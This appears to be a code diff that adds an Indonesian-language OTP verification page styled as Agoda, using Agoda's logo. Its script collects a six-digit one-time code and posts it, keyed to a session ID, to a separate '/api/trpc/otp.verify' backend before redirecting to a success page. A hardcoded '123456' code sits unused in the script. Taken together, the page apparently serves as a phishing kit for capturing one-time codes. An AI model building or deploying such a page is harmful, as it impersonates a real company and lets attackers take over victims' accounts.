@@ -1,0 +1,566 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifikasi OTP - Agoda</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', 'Cantarell', sans-serif;
+            background: linear-gradient(135deg, #f0f4ff 0%, #ffffff 50%, #f0f4ff 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 420px;
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+            padding: 40px 32px;
+        }
+
+        .logo-container {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+
+        .logo {
+            height: 48px;
+            margin-bottom: 24px;
+        }
+
+        .title {
+            font-size: 28px;
+            font-weight: 700;
+            color: #1a1a1a;
+            margin-bottom: 8px;
+        }
+
+        .subtitle {
+            font-size: 14px;
+            color: #666;
+            line-height: 1.5;
+        }
+
+        .back-button {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 40px;
+            height: 40px;
+            margin-bottom: 24px;
+            background: #f5f5f5;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .back-button:hover {
+            background: #efefef;
+        }
+
+        .back-button svg {
+            width: 20px;
+            height: 20px;
+            color: #333;
+        }
+
+        .form-group {
+            margin-bottom: 24px;
+        }
+
+        .form-label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 16px;
+        }
+
+        .otp-inputs {
+            display: flex;
+            gap: 8px;
+            justify-content: center;
+            margin-bottom: 16px;
+        }
+
+        .otp-input {
+            width: 48px;
+            height: 56px;
+            padding: 0;
+            text-align: center;
+            font-size: 18px;
+            font-weight: 600;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-family: inherit;
+            transition: all 0.2s;
+        }
+
+        .otp-input:focus {
+            outline: none;
+            border-color: #0066cc;
+            background: #f8faff;
+            box-shadow: 0 0 0 3px rgba(0, 102, 204, 0.1);
+        }
+
+        .otp-input.error {
+            border-color: #dc2626;
+            background: #fef2f2;
+        }
+
+        .otp-input:disabled {
+            background: #f5f5f5;
+            color: #999;
+            cursor: not-allowed;
+        }
+
+        .error-message {
+            padding: 12px;
+            background: #fef2f2;
+            border: 1px solid #fecaca;
+            border-radius: 8px;
+            color: #dc2626;
+            font-size: 13px;
+            margin-bottom: 16px;
+            display: none;
+        }
+
+        .error-message.show {
+            display: block;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 14px 16px;
+            background: #0066cc;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 24px;
+        }
+
+        .submit-btn:hover:not(:disabled) {
+            background: #0052a3;
+            box-shadow: 0 4px 12px rgba(0, 102, 204, 0.3);
+        }
+
+        .submit-btn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+            opacity: 0.6;
+        }
+
+        .spinner {
+            width: 16px;
+            height: 16px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .timer-section {
+            margin-top: 32px;
+            margin-bottom: 32px;
+        }
+
+        .timer-header {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 12px;
+        }
+
+        .timer-icon {
+            width: 20px;
+            height: 20px;
+        }
+
+        .timer-text {
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .timer-text.blue {
+            color: #0066cc;
+        }
+
+        .timer-text.orange {
+            color: #ff8c00;
+        }
+
+        .timer-text.red {
+            color: #dc2626;
+        }
+
+        .timer-bar-container {
+            width: 100%;
+            height: 6px;
+            background: #e5e5e5;
+            border-radius: 3px;
+            overflow: hidden;
+        }
+
+        .timer-bar {
+            height: 100%;
+            background: #0066cc;
+            transition: width 1s linear, background-color 0.3s;
+            border-radius: 3px;
+        }
+
+        .timer-bar.orange {
+            background: #ff8c00;
+        }
+
+        .timer-bar.red {
+            background: #dc2626;
+        }
+
+        .resend-section {
+            text-align: center;
+            margin-top: 32px;
+        }
+
+        .resend-text {
+            font-size: 13px;
+            color: #666;
+            margin-bottom: 12px;
+        }
+
+        .resend-btn {
+            background: none;
+            border: none;
+            color: #0066cc;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            transition: color 0.2s;
+        }
+
+        .resend-btn:hover:not(:disabled) {
+            color: #0052a3;
+        }
+
+        .resend-btn:disabled {
+            color: #999;
+            cursor: not-allowed;
+            opacity: 0.6;
+        }
+
+        .footer {
+            margin-top: 32px;
+            padding-top: 24px;
+            border-top: 1px solid #eee;
+            text-align: center;
+            font-size: 12px;
+            color: #999;
+            line-height: 1.6;
+        }
+
+        .footer a {
+            color: #0066cc;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 32px 20px;
+            }
+
+            .title {
+                font-size: 24px;
+            }
+
+            .otp-input {
+                width: 44px;
+                height: 52px;
+                font-size: 16px;
+            }
+
+            .otp-inputs {
+                gap: 6px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo-container">
+            <img src="https://cdn6.agoda.net/images/kite-js/logo/agoda/color-default.svg" alt="Agoda Logo" class="logo">
+            <br><br>
+            <h4 class="title">Verifikasi OTP</h4>
+            <p class="subtitle">Kami telah mengirimkan kode 6 digit ke email atau nomor telepon Anda.</p>
+        </div>
+
+
+
+        <div id="errorMessage" class="error-message"></div>
+
+        <form onsubmit="handleSubmit(event)">
+            <div class="form-group">
+
+                <div class="otp-inputs" id="otpContainer">
+                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric" data-index="0">
+                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric" data-index="1">
+                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric" data-index="2">
+                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric" data-index="3">
+                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric" data-index="4">
+                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric" data-index="5">
+                </div>
+            </div>
+
+            <button type="submit" class="submit-btn" id="submitBtn">
+                <span id="submitText">Lanjutkan</span>
+            </button>
+        </form>
+
+        <div class="timer-section">
+            <div class="timer-header">
+                <svg class="timer-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+                </svg>
+                <span class="timer-text blue" id="timerText">Kode berlaku dalam 5:00</span>
+            </div>
+            <div class="timer-bar-container">
+                <div class="timer-bar" id="timerBar" style="width: 100%"></div>
+            </div>
+        </div>
+
+        <div class="resend-section">
+            <p class="resend-text">Belum menerima kode?</p>
+            <button type="button" class="resend-btn" id="resendBtn" disabled>Kirim ulang OTP</button>
+        </div>
+
+        <div class="footer">
+            <p>Jangan bagikan kode OTP Anda kepada siapa pun. Agoda tidak akan pernah meminta kode Anda.</p>
+        </div>
+    </div>
+
+    <script>
+        const OTP_DURATION = 300; // 5 minutes
+        const VALID_OTP = '123456';
+        let timeLeft = OTP_DURATION;
+        let timerInterval = null;
+
+        // Initialize OTP inputs
+        const otpInputs = document.querySelectorAll('.otp-input');
+        otpInputs.forEach((input, index) => {
+            input.addEventListener('input', (e) => {
+                if (!/^\d$/.test(e.target.value)) {
+                    e.target.value = '';
+                    return;
+                }
+                if (index < otpInputs.length - 1 && e.target.value) {
+                    otpInputs[index + 1].focus();
+                }
+            });
+
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && !e.target.value && index > 0) {
+                    otpInputs[index - 1].focus();
+                }
+            });
+
+            input.addEventListener('paste', (e) => {
+                e.preventDefault();
+                const pastedData = (e.clipboardData || window.clipboardData).getData('text');
+                const digits = pastedData.replace(/\D/g, '').slice(0, 6);
+                
+                digits.split('').forEach((digit, i) => {
+                    if (i < otpInputs.length) {
+                        otpInputs[i].value = digit;
+                    }
+                });
+            });
+        });
+
+        function startTimer() {
+            timerInterval = setInterval(() => {
+                timeLeft--;
+                updateTimer();
+
+                if (timeLeft <= 0) {
+                    clearInterval(timerInterval);
+                    otpInputs.forEach(input => input.disabled = true);
+                    document.getElementById('submitBtn').disabled = true;
+                }
+            }, 1000);
+        }
+
+        function updateTimer() {
+            const mins = Math.floor(timeLeft / 60);
+            const secs = timeLeft % 60;
+            const timeStr = `${mins}:${secs.toString().padStart(2, '0')}`;
+
+            const timerText = document.getElementById('timerText');
+            const timerBar = document.getElementById('timerBar');
+            const percentage = (timeLeft / OTP_DURATION) * 100;
+
+            if (timeLeft <= 0) {
+                timerText.textContent = 'Kode OTP Kadaluarsa';
+                timerText.className = 'timer-text red';
+                timerBar.className = 'timer-bar red';
+                timerBar.style.width = '0%';
+            } else if (timeLeft < 60) {
+                timerText.textContent = `Kode berlaku dalam ${timeStr}`;
+                timerText.className = 'timer-text orange';
+                timerBar.className = 'timer-bar orange';
+                timerBar.style.width = `${percentage}%`;
+            } else {
+                timerText.textContent = `Kode berlaku dalam ${timeStr}`;
+                timerText.className = 'timer-text blue';
+                timerBar.className = 'timer-bar';
+                timerBar.style.width = `${percentage}%`;
+            }
+        }
+
+        async function handleSubmit(event) {
+            event.preventDefault();
+
+            const otp = Array.from(otpInputs).map(input => input.value).join('');
+            const errorMessage = document.getElementById('errorMessage');
+            const submitBtn = document.getElementById('submitBtn');
+            const submitText = document.getElementById('submitText');
+
+            errorMessage.classList.remove('show');
+
+            if (otp.length !== 6) {
+                errorMessage.textContent = 'OTP harus 6 digit';
+                errorMessage.classList.add('show');
+                return;
+            }
+
+            if (timeLeft <= 0) {
+                errorMessage.textContent = 'Kode OTP telah kadaluarsa';
+                errorMessage.classList.add('show');
+                return;
+            }
+
+            // Show loading state
+            submitBtn.disabled = true;
+            submitText.innerHTML = '<span class="spinner"></span> Memverifikasi...';
+            otpInputs.forEach(input => input.disabled = true);
+
+            try {
+                // Simulate API call
+                const sessionId = new URLSearchParams(window.location.search).get('sessionId');
+                const response = await fetch('/api/trpc/otp.verify', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        otp,
+                        sessionId,
+                    }),
+                });
+
+                const data = await response.json();
+
+                if (data.result && data.result.data && data.result.data.success) {
+                    // Redirect to success page
+                    window.location.href = `/success?sessionId=${sessionId}`;
+                } else {
+                    errorMessage.textContent = data.result?.data?.error || 'OTP tidak valid. Silakan coba lagi.';
+                    errorMessage.classList.add('show');
+                }
+            } catch (error) {
+                errorMessage.textContent = 'Gagal memverifikasi OTP. Silakan coba lagi.';
+                errorMessage.classList.add('show');
+                console.error('Error:', error);
+            } finally {
+                submitBtn.disabled = false;
+                submitText.textContent = 'Lanjutkan';
+                otpInputs.forEach(input => input.disabled = false);
+            }
+        }
+
+        async function handleResend() {
+            const resendBtn = document.getElementById('resendBtn');
+            const errorMessage = document.getElementById('errorMessage');
+
+            resendBtn.disabled = true;
+
+            try {
+                const sessionId = new URLSearchParams(window.location.search).get('sessionId');
+                const response = await fetch('/api/trpc/otp.resend', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ sessionId }),
+                });
+
+                const data = await response.json();
+
+                if (data.result && data.result.data && data.result.data.success) {
+                    // Reset timer
+                    timeLeft = OTP_DURATION;
+                    clearInterval(timerInterval);
+                    updateTimer();
+                    startTimer();
+                    
+                    // Clear OTP inputs
+                    otpInputs.forEach(input => input.value = '');
+                    otpInputs[0].focus();
+                    
+                    errorMessage.classList.remove('show');
+                } else {
+                    errorMessage.textContent = data.result?.data?.error || 'Gagal mengirim ulang OTP.';
+                    errorMessage.classList.add('show');
+                }
+            } catch (error) {
+                errorMessage.textContent = 'Gagal mengirim ulang OTP. Silakan coba lagi.';
+                errorMessage.classList.add('show');
+                console.error('Error:', error);
+            } finally {
+                resendBtn.disabled = true;
+            }
+        }
+
+        document.getElementById('resendBtn').addEventListener('click', handleResend);
+
+        // Start timer on page load
+        window.addEventListener('load', () => {
+            startTimer();
+        });
+
+        // Prevent non-numeric input in OTP fields
+        otpInputs.forEach(input => {
+            input.addEventListener('input', function(e) {
+                this.value = this.value.replace(/[^0-9]/g, '');
+            });
+        });
+    </script>
+</body>
+</html>
